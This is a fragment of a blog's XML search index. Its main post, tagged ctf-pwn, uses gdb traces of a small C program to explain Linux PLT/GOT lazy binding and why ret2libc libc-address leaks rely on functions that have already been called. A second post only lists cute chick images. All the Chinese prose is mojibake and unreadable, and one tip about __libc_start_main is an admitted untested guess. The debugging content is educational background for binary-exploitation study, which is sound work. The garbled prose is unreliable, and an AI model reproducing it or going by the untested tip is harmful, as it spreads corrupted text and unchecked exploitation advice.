    <content type="html"><![CDATA[<p>Linux åŠ¨æ€é“¾æ¥ä¸å»¶è¿Ÿç»‘å®šæœºåˆ¶</p><p><strong>Qï¼š</strong></p><ol><li>ä¸ºä»€ä¹ˆret2libcæ³„éœ²åŸºå€æ—¶è¦é€‰æ‹©å·²ç»ä½¿ç”¨è¿‡çš„å‡½æ•°ï¼Ÿ</li><li>ä½•ä¸ºå»¶è¿Ÿç»‘å®šï¼Ÿ</li></ol><h2 id="Linux-åŠ¨æ€é“¾æ¥ä¸å»¶è¿Ÿç»‘å®šæœºåˆ¶"><a href="#Linux-åŠ¨æ€é“¾æ¥ä¸å»¶è¿Ÿç»‘å®šæœºåˆ¶" class="headerlink" title="Linux åŠ¨æ€é“¾æ¥ä¸å»¶è¿Ÿç»‘å®šæœºåˆ¶"></a>Linux åŠ¨æ€é“¾æ¥ä¸å»¶è¿Ÿç»‘å®šæœºåˆ¶</h2><p>â€‹    å‡è®¾ï¼Œå†™äº†ä¸€ä¸ªå‡½æ•°<code>f()</code>ï¼Œè°ƒç”¨äº†glibcä¸­å‡½æ•°<code>x()</code>ï¼Œåœ¨å¯æ‰§è¡Œæ–‡ä»¶æ˜¯å¦‚ä½•ç¼–è¯‘çš„ï¼Ÿ</p><p>â€‹    å¯¹äºlibcä¸­çš„å‡½æ•°ï¼Œä¾‹å¦‚systemã€putsã€writeç­‰ï¼Œéœ€è¦åœ¨ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œä¸åŒç‰ˆæœ¬çš„libcåŠ è½½çš„ä½ç½®å„ä¸ç›¸åŒï¼Œgccæ²¡æœ‰åŠæ³•ç›´æ¥åœ¨å‡½æ•°<code>f()</code>çš„æ±‡ç¼–æŒ‡ä»¤ä¸­ç›´æ¥callå‡½æ•°<code>x()</code>çš„çœŸå®åœ°å€</p><p>â€‹    å› æ­¤ï¼Œéœ€è¦åœ¨è°ƒç”¨å‰åŠ å…¥ä¸€ä¸ªå¯»æ‰¾å‡½æ•°åœ°å€çš„è¿‡ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text<br> ...<br> call f_stub<br> ...<br> <br> ...<br> f_stub:<br>  1. find and save function f() entry point in f_stub_addr<br>     2. mov eax, [f_addr]<br>        jmp eax<br> ...<br> <br>.data<br> f_addr  // å­˜å‚¨å®é™…çš„f()åœ°å€<br></code></pre></td></tr></table></figure><p>â€‹    å¦‚ä¸Šè¿°è¿‡ç¨‹ï¼Œf_stubå»å¯»æ‰¾å®é™…çš„åœ°å€ï¼Œå­˜å‚¨åœ¨f_addrä¸­ï¼Œç„¶åè°ƒç”¨å®ƒ</p><p>â€‹    linuxçš„åŠ¨æ€é“¾æ¥è¿‡ç¨‹ä¸ä¸Šè¿°ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç”±ä¸€ä¸ªå­˜æ”¾å¤–éƒ¨å‡½æ•°åœ°å€æ•°æ®GOTè¡¨ï¼ˆå¯¹åº”f_addr)ï¼Œå’Œä¸€æ®µå‡½æ•°è°ƒç”¨é¢å¤–çš„ä»£ç PLTè¡¨ï¼ˆå¯¹åº”f_stub)</p><p>â€‹    åæ–‡ä¼šå…·ä½“åˆ†æå…¶æœºåˆ¶</p><h5 id="å®éªŒå‚è€ƒ"><a href="#å®éªŒå‚è€ƒ" class="headerlink" title="å®éªŒå‚è€ƒ"></a>å®éªŒå‚è€ƒ</h5><p><a href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL</a></p><p><a href="https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click</a></p><h5 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_banner</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to World of PLT and GOT\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    print_banner();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="ç¼–è¯‘é“¾æ¥"><a href="#ç¼–è¯‘é“¾æ¥" class="headerlink" title="ç¼–è¯‘é“¾æ¥"></a>ç¼–è¯‘é“¾æ¥</h5><p><code>gcc -Wall  -g test.c -o test.o -m32</code></p><p><strong>å¹³å°</strong>ï¼š <strong>kali</strong>-<strong>linux</strong></p><p>å¼€å§‹è°ƒè¯•</p><p><strong>é¦–å…ˆï¼Œåœ¨printfå‡½æ•°è°ƒç”¨å‰ä¸‹ä¸€ä¸ªæ–­ç‚¹</strong></p><p><img src="/img/plt&got/1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[-------------------------------------code-------------------------------------]<br>   0x555555555134 &lt;frame_dummy+4&gt;:      jmp    0x5555555550b0 &lt;register_tm_clones&gt;<br>   0x555555555139 &lt;print_banner&gt;:       push   rbp<br>   0x55555555513a &lt;print_banner+1&gt;:     mov    rbp,rsp<br>=&gt; 0x55555555513d &lt;print_banner+4&gt;:     lea    rax,[rip+0xec4]        # 0x555555556008<br>   0x555555555144 &lt;print_banner+11&gt;:    mov    rdi,rax<br>   0x555555555147 &lt;print_banner+14&gt;:    call   0x555555555030 &lt;puts@plt&gt;<br>   0x55555555514c &lt;print_banner+19&gt;:    nop<br>   0x55555555514d &lt;print_banner+20&gt;:    pop    rbp<br></code></pre></td></tr></table></figure><p>è·³è½¬åˆ°äº†0x555555555030è¿™ä¸ªåœ°å€ï¼Œgdbå¯¹å…¶çš„æ ‡æ³¨ä¸º&lt;puts@plt&gt;</p><p>æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªåœ°å€ä¸Šçš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x555555555030<br>   0x555555555030 &lt;puts@plt&gt;:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 &lt;puts@got[plt]&gt;<br>   0x555555555036 &lt;puts@plt+6&gt;: push   0x0<br>   0x55555555503b &lt;puts@plt+11&gt;:        jmp    0x555555555020<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Œjmp 0x555555558000ï¼Œgdbå¯¹å…¶çš„æ ‡æ³¨ä¸º&lt;puts@got[plt]&gt;ï¼ŒæŸ¥çœ‹è¿™ä¸ªåœ°å€ä¸Šçš„å€¼ï¼Œä¼šå‘ç°è¿™ä¸ªæŒ‡ä»¤åœ¨åŸåœ°è·³è½¬ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555558000 <br>0x555555558000 &lt;puts@got[plt]&gt;: 0x0000555555555036 //è¿™ä¸ªåœ°å€å°±æ˜¯ä¸Šé¢pltè¡¨çš„ç¬¬äºŒæ¡æŒ‡ä»¤<br></code></pre></td></tr></table></figure><p>ç›¸å½“äºä»€ä¹ˆä¹Ÿæ²¡åš</p><p>é‚£ä¹ˆæ ¹æ®æ–‡ç« å¼€å¤´çš„ä»‹ç»ï¼Œå¯»æ‰¾å‡½æ•°çš„å·¥ä½œè‚¯å®šæ˜¯ç”±ç¬¬ä¸‰æ¡æŒ‡ä»¤ï¼Œ<code>jmp 0x555555555020</code>æ¥å®Œæˆçš„ï¼Œè¿™é‡Œå…ˆä¸å¯¹è¿™ä¸ªå‡½æ•°è¿›è¡Œåˆ†æï¼Œç›´æ¥æ¥çœ‹ç»“æœ</p><p><strong>åœ¨printfå‡½æ•°åé¢ä¸‹æ–­ç‚¹ï¼Œé‡æ–°æŸ¥çœ‹åˆšæ‰&lt;puts@got[plt]&gt;ä¸Šçš„å†…å®¹</strong></p><p><img src="/img/plt&got/2.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555558000<br>0x555555558000 &lt;puts@got[plt]&gt;: 0x00007ffff7c75db0<br></code></pre></td></tr></table></figure><p>å‘ç°è¿™ä¸ªåœ°æ–¹çš„å€¼å˜äº†ï¼Œè€Œè¿™ä¸ªæ”¹å˜åçš„å€¼å°±æ˜¯putså‡½æ•°åœ¨libcä¸­çš„åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x00007ffff7c75db0<br>   0x7ffff7c75db0 &lt;__GI__IO_puts&gt;:      push   r14<br>   0x7ffff7c75db2 &lt;__GI__IO_puts+2&gt;:    push   r13<br>   0x7ffff7c75db4 &lt;__GI__IO_puts+4&gt;:    push   r12<br>   0x7ffff7c75db6 &lt;__GI__IO_puts+6&gt;:    mov    r12,rdi<br>   0x7ffff7c75db9 &lt;__GI__IO_puts+9&gt;:    push   rbp<br>   0x7ffff7c75dba &lt;__GI__IO_puts+10&gt;:   push   rbx<br>   0x7ffff7c75dbb &lt;__GI__IO_puts+11&gt;:   sub    rsp,0x10<br>   0x7ffff7c75dbf &lt;__GI__IO_puts+15&gt;:   call   0x7ffff7c28110 &lt;*ABS*+0x99da0@plt&gt;<br>   0x7ffff7c75dc4 &lt;__GI__IO_puts+20&gt;:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18<br>   0x7ffff7c75dcb &lt;__GI__IO_puts+27&gt;:   mov    rbx,rax<br></code></pre></td></tr></table></figure><p><strong>å› æ­¤å¯ä»¥å¾—å‡ºç»“è®º</strong></p><p>â€‹    pltè¡¨ä¸­ä¼šå…ˆå°è¯•è·³è½¬åˆ°gotè¡¨ä¸Šçš„å‡½æ•°åœ°å€ï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œä¼šè¿›è¡Œä¸€æ¬¡æ— æ•ˆè·³è½¬ï¼Œç„¶åå»å¯»æ‰¾çœŸæ­£çš„åœ°å€å¡«å……åœ¨gotè¡¨é¡¹ä¸Šï¼Œç„¶åè°ƒç”¨ï¼›å¦‚æœæ˜¯ç¬¬äºŒæ¬¡è°ƒç”¨ï¼Œä¼šç›´æ¥jmpåˆ°gotè¡¨çœŸå®çš„å‡½æ•°åœ°å€ä¸Š</p><p>â€‹    è¿™æ ·å°±æ˜¯ä¸ºä»€ä¹ˆret2libcéœ€è¦ä½¿ç”¨ç”¨å·²è¢«è°ƒç”¨è¿‡çš„å‡½æ•°</p><p><em>tipsï¼š</em></p><p><em>linuxç¨‹åºéƒ½æœ‰ä¸€ä¸ªlibc_start_mainå‡½æ•°ï¼Œä¸”ä¼šåœ¨mainå‡½æ•°ä¹‹å‰è¢«è°ƒç”¨ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ret2libcæ—¶æ— è„‘ç”¨è¿™ä¸ªå‡½æ•°(åªæ˜¯ä¸ªäººçŒœæµ‹ï¼Œå¹¶æœªå®é™…éªŒè¯)</em></p><p><strong>ç„¶åè§£å†³å¦‚ä½•å¯»æ‰¾å‡½æ•°åœ°å€çš„é—®é¢˜</strong>ï¼š</p><p>â€‹    åœ¨pltè¡¨çš„ç¬¬äºŒæ¡æ±‡ç¼–æŒ‡ä»¤ä¸­ï¼Œpush 0x0ä¸ºå¯»å€å‡½æ•°æä¾›äº†ä¸€ä¸ªå‚æ•°ï¼Œå¦‚æœæ‰“å¼€ä¸€ä¸ªå…·æœ‰å¤šä¸ªpltè¡¨é¡¹çš„ç¨‹åºï¼Œä¼šå‘ç°æ¯ä¸€é¡¹è¿™ä¸ªå€¼éƒ½æ˜¯ä¸åŒçš„ï¼š</p><p><img src="/img/plt&got/3.jpg"></p><p>â€‹    è¿™ä¸ªpushçš„å€¼å”¯ä¸€æ ‡è¯†äº†å¯»æ‰¾çš„å‡½æ•°ï¼Œ</p><p>â€‹    ç„¶åå†çœ‹ç¬¬ä¸‰æ¡æŒ‡ä»¤ï¼Œè§‚å¯Ÿå‘ç°è¿™ä¸ªjmpæŒ‡ä»¤è·³è½¬åˆ°äº†pltè¡¨çš„å¼€å¤´ï¼ˆå¯ä»¥åœ¨objdumpé‡Œçœ‹åˆ°è¿™ä¹Ÿæ˜¯ä¸€ä¸ªpltè¡¨é¡¹ï¼Œä½†æ˜¯ä»£ç ä¸å…¶ä»–è¡¨é¡¹å½¢å¼ä¸åŒï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x555555555020<br>   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0<br>   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8<br></code></pre></td></tr></table></figure><p>å¦‚æœåœ¨gdbæœªå¼€å§‹è°ƒè¯•çš„æ—¶å€™ï¼ŒæŸ¥çœ‹è¿™ä¸ªjmpçš„å€¼ï¼Œæ˜¯0x0</p><p>è€Œåœ¨printfå‡½æ•°å‰çš„æ–­ç‚¹æŸ¥çœ‹ï¼Œä¼šå‘ç°å®ƒå‘ç”Ÿäº†å˜åŒ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555557ff8<br>0x555555557ff8: 0x00007ffff7fdc080<br><br>gdb-peda$ x/10i 0x00007ffff7fdc080<br>   0x7ffff7fdc080 &lt;_dl_runtime_resolve_xsavec&gt;: push   rbx<br>   0x7ffff7fdc081 &lt;_dl_runtime_resolve_xsavec+1&gt;:       mov    rbx,rsp<br>   0x7ffff7fdc084 &lt;_dl_runtime_resolve_xsavec+4&gt;:       and    rsp,0xffffffffffffffc0<br>   0x7ffff7fdc088 &lt;_dl_runtime_resolve_xsavec+8&gt;:<br>    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 &lt;_rtld_global_ro+432&gt;<br>   0x7ffff7fdc08f &lt;_dl_runtime_resolve_xsavec+15&gt;:      mov    QWORD PTR [rsp],rax<br>   0x7ffff7fdc093 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp+0x8],rcx<br>   0x7ffff7fdc098 &lt;_dl_runtime_resolve_xsavec+24&gt;:      mov    QWORD PTR [rsp+0x10],rdx<br>   0x7ffff7fdc09d &lt;_dl_runtime_resolve_xsavec+29&gt;:      mov    QWORD PTR [rsp+0x18],rsi<br>   0x7ffff7fdc0a2 &lt;_dl_runtime_resolve_xsavec+34&gt;:      mov    QWORD PTR [rsp+0x20],rdi<br>   0x7ffff7fdc0a7 &lt;_dl_runtime_resolve_xsavec+39&gt;:      mov    QWORD PTR [rsp+0x28],r8<br><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸º<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>ï¼Œæ­¤å¤„ä¸åœ¨å¯¹å…¶å…·ä½“åˆ†æï¼Œå…¶ç”¨å¤„å³ä¸ºå¯»æ‰¾ç¼–å·ä¸º<code>reloc_index</code>çš„å‡½æ•°</p><h5 id="æ•´ä½“æµç¨‹"><a href="#æ•´ä½“æµç¨‹" class="headerlink" title="æ•´ä½“æµç¨‹"></a>æ•´ä½“æµç¨‹</h5><p><strong>ç¬¬ä¸€æ¬¡è°ƒç”¨</strong></p><p><img src="/img/plt&got/4.jpg"></p><p><strong>ç¬¬äºŒæ¬¡è°ƒç”¨</strong></p><p><img src="/img/plt&got/5.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¯çˆ±çš„å°é»„é¸¡</title>
    <link href="/2022/11/16/%E6%9D%82%E9%A1%B9/%E5%B0%8F%E9%BB%84%E9%B8%A1/"/>
    <url>/2022/11/16/%E6%9D%82%E9%A1%B9/%E5%B0%8F%E9%BB%84%E9%B8%A1/</url>
    
    <content type="html"><![CDATA[<p>å¯çˆ±çš„å°é»„é¸¡ 0v0</p><p><img src="/img/basic/1.jpg"><br><img src="/img/basic/2.jpg"><br><img src="/img/basic/3.jpg"><br><img src="/img/basic/4.jpg"><br><img src="/img/basic/5.jpg"><br><img src="/img/basic/6.jpg"><br><img src="/img/basic/7.jpg"><br><img src="/img/basic/9.jpg"><br><img src="/img/basic/1.gif"><br><img src="/img/basic/2.gif"></p>]]></content>
    
    
    <categories>
      
      <category>æ‚é¡¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
